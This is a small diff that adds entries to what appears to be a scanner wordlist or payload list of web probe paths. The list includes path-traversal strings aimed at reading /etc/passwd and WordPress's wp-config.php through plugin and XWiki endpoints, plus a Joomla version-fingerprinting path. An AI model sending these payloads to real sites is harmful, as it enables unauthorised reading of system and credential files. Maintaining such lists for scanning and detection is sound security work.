@@ -312,3 +312,5 @@
 /wp-json/wooconvo/v1/download-file?order_id=1&filename=../../../../wp-config.php
 /xwiki/bin/skin/..%252f/..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
 /bin/skin/..%252f/..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
+/administrator/manifests/files/joomla.xml
+/static/js/../../../../../../../../../../../../../../etc/passwd
